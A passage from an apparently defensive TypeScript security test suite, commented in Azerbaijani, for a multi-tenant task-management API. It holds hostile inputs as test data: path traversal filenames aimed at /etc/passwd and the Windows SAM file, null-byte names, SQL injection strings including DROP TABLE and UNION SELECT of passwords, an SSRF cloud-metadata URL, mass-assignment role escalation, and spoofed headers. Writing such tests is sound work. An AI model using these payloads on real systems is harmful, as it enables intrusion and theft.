      console.warn('⚠️  ZƏIF: .exe fayl yükləndi — fayl uzantısı filtri yoxdur')
    }
  })

  test('.sh fayl uzantısı ilə yükləmə rədd edilməlidir', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['#!/bin/bash\necho hacked']), 'script.sh')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, '.sh file upload')
    if (res.status === 201 || res.status === 200) {
      console.warn('⚠️  ZƏIF: .sh fayl yükləndi — fayl uzantısı filtri yoxdur')
    }
  })

  // 4.6 — İkili uzantı hücumu
  test('İkili uzantı: file.xlsx.exe rədd edilməlidir', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['fake']), 'report.xlsx.exe')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Double extension upload')
    if (res.status === 201 || res.status === 200) {
      console.warn('⚠️  ZƏIF: İkili uzantılı fayl qəbul edildi (.xlsx.exe)')
    }
  })

  // 4.7 — Path traversal fayl adında
  test('Path traversal fayl adında: ../../etc/passwd', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['test']), '../../etc/passwd')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Path traversal in filename')
    // Fayl adı sanitize edilməlidir
  })

  test('Path traversal: ..\\..\\windows\\system32\\config\\sam', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['test']), '..\\..\\windows\\system32\\config\\sam')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Windows path traversal')
  })

  // 4.8 — Null byte injection fayl adında
  test('Null byte fayl adında: file.txt%00.exe', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['test']), 'file.txt\x00.exe')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Null byte filename')
  })

  // 4.9 — Boş fayl yükləmə
  test('Boş fayl yükləmə rədd edilməlidir', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['']), 'empty.txt')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Empty file upload')
  })

  // 4.10 — Fayl sahəsi olmadan yükləmə
  test('Fayl sahəsi olmadan yükləmə 400 qaytarmalıdır', async () => {
    const formData = new FormData()
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'No file field upload')
    expect([400, 404, 500]).toContain(res.status)
    if (res.status === 500) {
      console.warn('🔴 BUG: Fayl olmadan upload 500 qaytarır — null check lazımdır')
    }
  })

  // 4.11 — Todoist attachment (50MB limit) — 60MB fayl cəhdi
  test('Todoist attachment: 60MB fayl rədd edilməlidir', async () => {
    const hugeContent = 'B'.repeat(60 * 1024 * 1024) // 60 MB
    const formData = new FormData()
    formData.append('file', new Blob([hugeContent]), 'huge.pdf')

    const res = await fetch(`${BASE}/todoist/tasks/fake-id/attachments`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, '60MB todoist attachment')
    expect([400, 413, 404]).toContain(res.status)
  }, 30000)
})

// ═════════════════════════════════════════════════════════════════════════════
// 5. BİZNES MƏNTİQ HÜCUMLARI
// ═════════════════════════════════════════════════════════════════════════════

describe('5. BİZNES MƏNTİQ HÜCUMLARI', () => {

  // 5.1 — dayOfMonth mənfi dəyər
  test('Template dayOfMonth -1 ilə yaradılmamalıdır', async () => {
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Negative Day Template',
        scheduleType: 'MONTHLY',
        dayOfMonth: -1,
        items: [{ title: 'test' }],
      }),
    })
    assertNotServerError(res.status, 'Negative dayOfMonth')
    if (res.status === 201 || res.status === 200) {
      const data = await res.json()
      console.warn('⚠️  BUG: dayOfMonth=-1 qəbul edildi — @Min(1) validation işləmir?')
      if (data.id) {
        await fetch(`${BASE}/templates/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
    expect([400]).toContain(res.status)
  })

  // 5.2 — dayOfMonth > 31
  test('Template dayOfMonth 50 ilə yaradılmamalıdır', async () => {
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Overflow Day Template',
        scheduleType: 'MONTHLY',
        dayOfMonth: 50,
        items: [{ title: 'test' }],
      }),
    })
    assertNotServerError(res.status, 'dayOfMonth 50')
    if (res.status === 201 || res.status === 200) {
      const data = await res.json()
      console.warn('⚠️  BUG: dayOfMonth=50 qəbul edildi — @Max(31) validation işləmir?')
      if (data.id) {
        await fetch(`${BASE}/templates/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
    expect([400]).toContain(res.status)
  })

  // 5.3 — notificationDay > deadlineDay (məntiq xətası)
  test('notificationDay > deadlineDay olmamalıdır (məntiq pozuntusu)', async () => {
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Logic Error Template',
        scheduleType: 'MONTHLY',
        dayOfMonth: 15,
        notificationDay: 20,
        deadlineDay: 10,
        items: [{ title: 'test' }],
      }),
    })
    assertNotServerError(res.status, 'notificationDay > deadlineDay')
    if (res.status === 201 || res.status === 200) {
      const data = await res.json()
      console.warn('⚠️  MƏNTİQ BUG: notificationDay(20) > deadlineDay(10) qəbul edildi!')
      if (data.id) {
        await fetch(`${BASE}/templates/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 5.4 — Mövcud olmayan istifadəçiyə tapşırıq təyin etmə
  test('Mövcud olmayan userId ilə tapşırıq yaratma uğursuz olmalıdır', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'Fake assignee test',
        type: 'GOREV',
        priority: 'HIGH',
        assigneeIds: ['00000000-0000-0000-0000-000000000099'],
        subTasks: [
          {
            title: 'Alt görev',
            assigneeIds: ['00000000-0000-0000-0000-000000000099'],
          },
        ],
      }),
    })
    assertNotServerError(res.status, 'Assign to non-existent user')
    if (res.status === 201 || res.status === 200) {
      const data = await res.json()
      console.warn('⚠️  BUG: Mövcud olmayan istifadəçiyə tapşırıq təyin edildi!')
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 5.5 — Boş items array ilə template
  test('Template boş items array ilə yaradılmamalıdır', async () => {
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Empty Items Template',
        scheduleType: 'DAILY',
        items: [],
      }),
    })
    assertNotServerError(res.status, 'Empty items template')
    if (res.status === 201 || res.status === 200) {
      const data = await res.json()
      console.warn('⚠️  BUG: Boş items ilə template yaradıldı — ən az 1 item lazımdır')
      if (data.id) {
        await fetch(`${BASE}/templates/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 5.6 — Mövcud olmayan template-i toggle etmə
  test('Mövcud olmayan template toggle 404 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/templates/00000000-0000-0000-0000-000000000000/toggle`, {
      method: 'POST',
      headers: authHeader(adminToken),
    })
    assertNotServerError(res.status, 'Toggle non-existent template')
    expect(res.status).toBe(404)
  })

  // 5.7 — Etibarsız scheduleType
  test('Etibarsız scheduleType rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Invalid Schedule',
        scheduleType: 'EVERY_SECOND',
        items: [{ title: 'test' }],
      }),
    })
    assertNotServerError(res.status, 'Invalid scheduleType')
    expect(res.status).toBe(400)
  })

  // 5.8 — Etibarsız priority
  test('Etibarsız priority GOREV tapşırıqda rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'Invalid Priority Task',
        type: 'TASK',
        priority: 'ULTRA_MEGA_HIGH',
      }),
    })
    assertNotServerError(res.status, 'Invalid priority')
    expect(res.status).toBe(400)
  })

  // 5.9 — Etibarsız tarix formatı
  test('Etibarsız dueDate formatı rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'Bad Date Task',
        type: 'TASK',
        dueDate: 'not-a-date',
      }),
    })
    assertNotServerError(res.status, 'Invalid dueDate format')
    expect(res.status).toBe(400)
  })

  // 5.10 — Mövcud olmayan template-i execute etmə
  test('Mövcud olmayan template execute 404 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/templates/00000000-0000-0000-0000-000000000000/execute`, {
      method: 'POST',
      headers: authHeader(adminToken),
    })
    assertNotServerError(res.status, 'Execute non-existent template')
    expect(res.status).toBe(404)
  })

  // 5.11 — Başlıqsız tapşırıq yaratma
  test('Başlıqsız tapşırıq yaradılmamalıdır', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        type: 'TASK',
        priority: 'MEDIUM',
      }),
    })
    assertNotServerError(res.status, 'Task without title')
    expect(res.status).toBe(400)
  })

  // 5.12 — Template adsız yaratma
  test('Template adsız yaradılmamalıdır', async () => {
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        scheduleType: 'DAILY',
        items: [{ title: 'test' }],
      }),
    })
    assertNotServerError(res.status, 'Template without name')
    expect(res.status).toBe(400)
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 6. RATE LİMİTİNG / DOS HÜCUMLARI
// ═════════════════════════════════════════════════════════════════════════════

describe('6. RATE LİMİTİNG / DOS HÜCUMLARI', () => {

  // 6.1 — 50 sorğu 1 saniyədə
  test('50 paralel sorğu 1 saniyədə — server çökməməlidir', async () => {
    const start = Date.now()
    const promises = Array.from({ length: 50 }, () =>
      fetch(`${BASE}/tasks`, { headers: authHeader(adminToken) })
        .then(r => r.status)
        .catch(() => 0)
    )
    const results = await Promise.all(promises)
    const elapsed = Date.now() - start

    // Heç biri 500 olmamalıdır
    const serverErrors = results.filter(s => s === 500).length
    if (serverErrors > 0) {
      console.warn(`🔴 ${serverErrors} sorğu 500 qaytardı — server stress altında çökür!`)
    }

    // Rate limiting varsa 429 gözləyirik
    const rateLimited = results.filter(s => s === 429).length
    if (rateLimited === 0) {
      console.warn('⚠️  Rate limiting yoxdur — 50 sorğunun hamısı qəbul edildi')
    }

    console.log(`   50 sorğu ${elapsed}ms-də tamamlandı. 429: ${rateLimited}, 500: ${serverErrors}`)
    expect(serverErrors).toBe(0)
  }, 30000)

  // 6.2 — Çox böyük JSON body (1MB)
  test('1MB JSON body rədd edilməlidir və ya qəbul edilməlidir (500 olmamalı)', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'x'.repeat(1000000), // 1MB başlıq
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, '1MB JSON body')
    expect([400, 413]).toContain(res.status)
  }, 15000)

  // 6.3 — Dərin iç-içə JSON (100 səviyyə)
  test('100 səviyyə iç-içə JSON — server çökməməlidir', async () => {
    let nested: any = { title: 'deep', type: 'TASK' }
    for (let i = 0; i < 100; i++) {
      nested = { inner: nested }
    }

    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify(nested),
    })
    assertNotServerError(res.status, 'Deeply nested JSON')
    expect([400, 413]).toContain(res.status)
  })

  // 6.4 — Çox uzun string (10000 simvol)
  test('10000 simvol başlıq — server çökməməlidir', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'A'.repeat(10000),
        type: 'TASK',
        priority: 'LOW',
      }),
    })
    assertNotServerError(res.status, '10000 char title')
    // Uzunluq limiti olmalıdır, amma olmaya da bilər
    if (res.status === 201 || res.status === 200) {
      const data = await res.json()
      console.warn('⚠️  ZƏIF: 10000 simvol başlıq qəbul edildi — MaxLength validation yoxdur')
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 6.5 — 1000 assigneeIds ilə template yaratma
  test('1000 assigneeIds ilə template — server çökməməlidir', async () => {
    const fakeIds = Array.from({ length: 1000 }, (_, i) =>
      `00000000-0000-0000-0000-${String(i).padStart(12, '0')}`
    )
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Mass Assign Template',
        scheduleType: 'DAILY',
        items: [{ title: 'test' }],
        assigneeIds: fakeIds,
      }),
    })
    assertNotServerError(res.status, '1000 assigneeIds template')
    if (res.status === 201 || res.status === 200) {
      const data = await res.json()
      console.warn('⚠️  ZƏIF: 1000 assigneeId qəbul edildi — limit yoxdur')
      if (data.id) {
        await fetch(`${BASE}/templates/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  }, 30000)

  // 6.6 — 500 subTask ilə tapşırıq
  test('500 subTask ilə tapşırıq — server çökməməlidir', async () => {
    const subTasks = Array.from({ length: 500 }, (_, i) => ({
      title: `SubTask ${i}`,
    }))
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: '500 SubTask Test',
        type: 'GOREV',
        priority: 'LOW',
        subTasks,
      }),
    })
    assertNotServerError(res.status, '500 subTasks')
    if (res.status === 201 || res.status === 200) {
      const data = await res.json()
      console.warn('⚠️  ZƏIF: 500 subTask qəbul edildi — limit yoxdur')
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  }, 30000)

  // 6.7 — Boş body ilə POST
  test('Boş body ilə POST /tasks 400 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: '',
    })
    assertNotServerError(res.status, 'Empty body POST /tasks')
    expect([400]).toContain(res.status)
  })

  // 6.8 — Etibarsız JSON body
  test('Etibarsız JSON body 400 qaytarmalıdır', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: {
        ...authHeader(adminToken),
        'Content-Type': 'application/json',
      },
      body: '{invalid json...',
    })
    assertNotServerError(res.status, 'Invalid JSON body')
    expect([400]).toContain(res.status)
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 7. TENANT İZOLYASİYASI
// ═════════════════════════════════════════════════════════════════════════════

describe('7. TENANT İZOLYASİYASI', () => {

  // 7.1 — Tenant A token-i ilə Tenant B resurslarına giriş
  test('Başqa tenant-ın template-ini görmək olmamalıdır', async () => {
    // Admin-in template-lərini yarat, sonra başqa tenant ilə oxu cəhdi
    const createRes = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Tenant Isolation Test Template',
        scheduleType: 'ONCE',
        items: [{ title: 'secret item' }],
      }),
    })
    const template = await createRes.json()
    const templateId = template.id

    if (templateId) {
      // Yeni tenant yarat (register ilə) — ayrı tenantId almalıdır
      const regRes = await fetch(`${BASE}/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: `tenant_test_${Date.now()}@hack.com`,
          password: '123456',
          fullName: 'Hacker',
          companyName: 'HackCorp',
        }),
      })

      if (regRes.ok) {
        const regData = await regRes.json()
        const hackerToken = regData.accessToken

        // Hacker template-i oxumağa çalışır
        const hackRes = await fetch(`${BASE}/templates/${templateId}`, {
          headers: authHeader(hackerToken),
        })
        assertNotServerError(hackRes.status, 'Cross-tenant template read')
        expect(hackRes.status).toBe(404) // Başqa tenant-ın template-i görünməməlidir

        if (hackRes.status === 200) {
          console.warn('🔴 KRİTİK: Cross-tenant data leak! Başqa tenant-ın template-i oxundu!')
        }

        // Hacker template-i silməyə çalışır
        const hackDelRes = await fetch(`${BASE}/templates/${templateId}`, {
          method: 'DELETE',
          headers: authHeader(hackerToken),
        })
        assertNotServerError(hackDelRes.status, 'Cross-tenant template delete')
        expect(hackDelRes.status).toBe(404)

        // Hacker template-i execute etməyə çalışır
        const hackExecRes = await fetch(`${BASE}/templates/${templateId}/execute`, {
          method: 'POST',
          headers: authHeader(hackerToken),
        })
        assertNotServerError(hackExecRes.status, 'Cross-tenant template execute')
        expect(hackExecRes.status).toBe(404)
      }

      // Təmizlik
      await fetch(`${BASE}/templates/${templateId}`, {
        method: 'DELETE',
        headers: authHeader(adminToken),
      })
    }
  }, 30000)

  // 7.2 — Cross-tenant task read
  test('Başqa tenant-ın tapşırığını oxumaq olmamalıdır', async () => {
    // Admin tapşırıq yaratsın
    const createRes = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'Cross-Tenant Secret Task',
        type: 'TASK',
        priority: 'HIGH',
      }),
    })
    const task = await createRes.json()
    const taskId = task.id

    if (taskId) {
      // Yeni tenant yarat
      const regRes = await fetch(`${BASE}/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: `tenant_task_${Date.now()}@hack.com`,
          password: '123456',
          fullName: 'Task Hacker',
          companyName: 'TaskHackCorp',
        }),
      })

      if (regRes.ok) {
        const regData = await regRes.json()
        const hackerToken = regData.accessToken

        // Hacker tapşırığı oxumağa çalışır
        const hackRes = await fetch(`${BASE}/tasks/${taskId}`, {
          headers: authHeader(hackerToken),
        })
        assertNotServerError(hackRes.status, 'Cross-tenant task read')
        expect(hackRes.status).toBe(404)

        if (hackRes.status === 200) {
          console.warn('🔴 KRİTİK: Cross-tenant task leak! Başqa tenant-ın tapşırığı oxundu!')
        }
      }

      // Təmizlik
      await fetch(`${BASE}/tasks/${taskId}`, {
        method: 'DELETE',
        headers: authHeader(adminToken),
      })
    }
  }, 30000)

  // 7.3 — Cross-tenant user list
  test('Başqa tenant-ın istifadəçilərini görmək olmamalıdır', async () => {
    const regRes = await fetch(`${BASE}/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: `tenant_users_${Date.now()}@hack.com`,
        password: '123456',
        fullName: 'User Hacker',
        companyName: 'UserHackCorp',
      }),
    })

    if (regRes.ok) {
      const regData = await regRes.json()
      const hackerToken = regData.accessToken

      const usersRes = await fetch(`${BASE}/users`, {
        headers: authHeader(hackerToken),
      })
      assertNotServerError(usersRes.status, 'Cross-tenant user list')

      if (usersRes.ok) {
        const users = await usersRes.json()
        const hasOtherTenantUsers = Array.isArray(users) && users.some(
          (u: any) => u.email && (
            u.email.includes('techflow.az') ||
            u.email.includes('admin@') ||
            u.email.includes('leyla@') ||
            u.email.includes('nigar@')
          )
        )
        if (hasOtherTenantUsers) {
          console.warn('🔴 KRİTİK: Cross-tenant user leak! Başqa tenant-ın istifadəçiləri görünür!')
        }
        expect(hasOtherTenantUsers).toBe(false)
      }
    }
  }, 30000)

  // 7.4 — Cross-tenant role tampering
  test('Başqa tenant-ın rolunu görə bilməməlidir', async () => {
    const regRes = await fetch(`${BASE}/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: `tenant_roles_${Date.now()}@hack.com`,
        password: '123456',
        fullName: 'Role Hacker',
        companyName: 'RoleHackCorp',
      }),
    })

    if (regRes.ok) {
      const regData = await regRes.json()
      const hackerToken = regData.accessToken

      // Hacker bütün rolları oxumağa çalışır
      const rolesRes = await fetch(`${BASE}/roles`, {
        headers: authHeader(hackerToken),
      })
      assertNotServerError(rolesRes.status, 'Cross-tenant roles list')

      if (rolesRes.ok) {
        const roles = await rolesRes.json()
        // Boş olmalıdır — bu tenant-ın rolu yoxdur
        if (Array.isArray(roles) && roles.length > 0) {
          console.warn('⚠️  Cross-tenant role sızıntısı — yoxlayin!')
        }
      }
    }
  }, 30000)
})

// ═════════════════════════════════════════════════════════════════════════════
// 8. HEADER MANİPULYASİYASI
// ═════════════════════════════════════════════════════════════════════════════

describe('8. HEADER MANİPULYASİYASI', () => {

  // 8.1 — Content-Type olmadan POST
  test('Content-Type olmadan POST 400 qaytarmalıdır (500 deyil)', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: JSON.stringify({ title: 'No CT', type: 'TASK' }),
    })
    assertNotServerError(res.status, 'No Content-Type header')
    // NestJS raw body parse edə bilmir — 400 gözlənilir
    expect([400, 415]).toContain(res.status)
  })

  // 8.2 — Yanlış Content-Type
  test('Content-Type: text/plain ilə JSON göndərmə', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${adminToken}`,
        'Content-Type': 'text/plain',
      },
      body: JSON.stringify({ title: 'Wrong CT', type: 'TASK' }),
    })
    assertNotServerError(res.status, 'Wrong Content-Type')
    expect([400, 415]).toContain(res.status)
  })

  // 8.3 — Content-Type: application/xml
  test('XML Content-Type rədd edilməlidir', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${adminToken}`,
        'Content-Type': 'application/xml',
      },
      body: '<task><title>XXE Test</title></task>',
    })
    assertNotServerError(res.status, 'XML Content-Type')
    expect([400, 415]).toContain(res.status)
  })

  // 8.4 — Çox böyük header
  test('Çox böyük Authorization header server-i çökdürməməlidir', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: {
        Authorization: 'Bearer ' + 'A'.repeat(50000),
        'Content-Type': 'application/json',
      },
    })
    // Böyük header server-i çökdürə bilər
    assertNotServerError(res.status, 'Oversized auth header')
    expect([400, 401, 413, 431]).toContain(res.status)
  })

  // 8.5 — Host header injection
  test('Host header injection — server cavab verməlidir (500 deyil)', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: {
        ...authHeader(adminToken),
        Host: 'evil.com',
      },
    })
    // fetch Host header-i override edə bilmir — amma server çökməməlidir
    assertNotServerError(res.status, 'Host header injection')
  })

  // 8.6 — Accept header manipulyasiyası
  test('Accept: application/xml ilə sorğu', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: {
        ...authHeader(adminToken),
        Accept: 'application/xml',
      },
    })
    assertNotServerError(res.status, 'Accept XML header')
    // NestJS JSON qaytarmalıdır
    const ct = res.headers.get('content-type')
    expect(ct).toContain('json')
  })

  // 8.7 — Duplicate Authorization headers
  test('İkili Authorization header ilə sorğu', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: [
        ['Authorization', `Bearer ${adminToken}`],
        ['Authorization', 'Bearer fake-token'],
        ['Content-Type', 'application/json'],
      ] as any,
    })
    assertNotServerError(res.status, 'Duplicate auth headers')
  })

  // 8.8 — X-Forwarded-For header manipulation
  test('X-Forwarded-For header ilə IP spoofing cəhdi', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: {
        ...authHeader(adminToken),
        'X-Forwarded-For': '127.0.0.1, 10.0.0.1',
        'X-Real-IP': '127.0.0.1',
      },
    })
    assertNotServerError(res.status, 'IP spoofing via headers')
    // Bu hücum rate-limiting bypass-a yol açar
    expect([200, 429]).toContain(res.status)
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 9. ƏLAVƏ PENETRASIYA TESTLƏRİ
// ═════════════════════════════════════════════════════════════════════════════

describe('9. ƏLAVƏ PENETRASIYA TESTLƏRİ', () => {

  // 9.1 — Mass assignment / field injection
  test('Mass assignment: role sahəsini body-dən dəyişdirmə cəhdi', async () => {
    const res = await fetch(`${BASE}/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: `massassign_${Date.now()}@test.com`,
        password: '123456',
        fullName: 'Hacker',
        companyName: 'HackCo',
        role: 'SUPER_ADMIN', // Bu qəbul edilməməlidir
        isSystemAdmin: true,  // Bu da qəbul edilməməlidir
      }),
    })
    assertNotServerError(res.status, 'Mass assignment attack')

    if (res.ok) {
      const data = await res.json()
      if (data.user?.role === 'SUPER_ADMIN') {
        console.warn('🔴 KRİTİK: Mass assignment vulnerability! role=SUPER_ADMIN qəbul edildi!')
      }
      if (data.user?.isSystemAdmin === true) {
        console.warn('🔴 KRİTİK: Mass assignment vulnerability! isSystemAdmin=true qəbul edildi!')
      }
      // Register həmişə TENANT_ADMIN rolu verməlidir
      expect(data.user?.role).toBe('TENANT_ADMIN')
    }
  })

  // 9.2 — SSRF cəhdi (Server-Side Request Forgery)
  test('SSRF: daxili URL tapşırıq description-da', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 'SSRF Test',
        description: 'http://169.254.169.254/latest/meta-data/',
        type: 'TASK',
      }),
    })
    assertNotServerError(res.status, 'SSRF in description')
    // Backend bu URL-i fetch etməməlidir
    if (res.ok) {
      const data = await res.json()
      if (data.id) {
        await fetch(`${BASE}/tasks/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 9.3 — CORS yoxlama
  test('CORS: Origin header ilə sorğu', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: {
        ...authHeader(adminToken),
        Origin: 'http://evil.com',
      },
    })
    assertNotServerError(res.status, 'CORS from evil origin')
    const acao = res.headers.get('access-control-allow-origin')
    if (acao === '*') {
      console.warn('⚠️  ZƏIF: CORS Access-Control-Allow-Origin: * — hər yerdən giriş mümkün')
    }
  })

  // 9.4 — HTTP method override
  test('X-HTTP-Method-Override: DELETE ilə GET sorğusu', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'GET',
      headers: {
        ...authHeader(adminToken),
        'X-HTTP-Method-Override': 'DELETE',
      },
    })
    assertNotServerError(res.status, 'HTTP method override')
    // GET 200 qaytarmalıdır — DELETE override olmamalıdır
    expect(res.status).toBe(200)
  })

  // 9.5 — Todoist endpoint-ləri stress test
  test('Todoist bulk action: 100 fake taskId ilə delete', async () => {
    const fakeIds = Array.from({ length: 100 }, (_, i) =>
      `00000000-0000-0000-0000-${String(i).padStart(12, '0')}`
    )
    const res = await fetch(`${BASE}/todoist/tasks/bulk`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        taskIds: fakeIds,
        action: 'delete',
      }),
    })
    assertNotServerError(res.status, 'Bulk delete 100 fake IDs')
  }, 15000)

  // 9.6 — Todoist search SQL injection
  test('Todoist search: SQL injection ilə', async () => {
    const payloads = [
      "'; DROP TABLE \"TodoistTask\";--",
      "1' OR '1'='1",
      "admin'/*",
      "UNION ALL SELECT NULL,NULL,password FROM \"User\"--",
    ]

    for (const payload of payloads) {
      const res = await fetch(
        `${BASE}/todoist/tasks/search?q=${encodeURIComponent(payload)}`,
        { headers: authHeader(adminToken) },
      )
      assertNotServerError(res.status, `Todoist search SQLi: ${payload.slice(0, 30)}`)
    }
  })

  // 9.7 — Path parameter injection
  test('Path parameter injection: /tasks/../../users', async () => {
    const res = await fetch(`${BASE}/tasks/..%2F..%2Fusers`, {
      headers: authHeader(adminToken),
    })
    assertNotServerError(res.status, 'Path traversal in URL')
    expect([400, 404]).toContain(res.status)
  })

  // 9.8 — Integer overflow cəhdi
  test('Integer overflow: dayOfMonth = 2147483647', async () => {
    const res = await fetch(`${BASE}/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Int Overflow Template',
        scheduleType: 'MONTHLY',
        dayOfMonth: 2147483647,
        items: [{ title: 'test' }],
      }),
    })
    assertNotServerError(res.status, 'Integer overflow dayOfMonth')
    expect([400]).toContain(res.status)
  })

  // 9.9 — Float əvəzinə slotNumber
  test('Float slotNumber: 1.5 rədd edilməlidir', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['test']), 'test.txt')
    formData.append('taskAssigneeId', 'fake-id')
    formData.append('slotNumber', '1.5')

    const res = await fetch(`${BASE}/task-assignee-files/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Float slotNumber')
    // parseInt('1.5') = 1, yəni qəbul edilə bilər
  })

